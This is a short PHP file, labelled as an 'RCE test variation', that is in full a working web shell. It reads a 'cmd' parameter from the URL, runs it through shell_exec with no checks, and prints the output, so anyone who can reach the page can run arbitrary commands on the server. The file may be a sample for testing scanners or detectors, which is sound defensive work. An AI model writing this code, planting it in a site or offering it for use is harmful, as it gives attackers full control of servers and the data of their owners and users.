<?php
// RCE test variation #1414
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>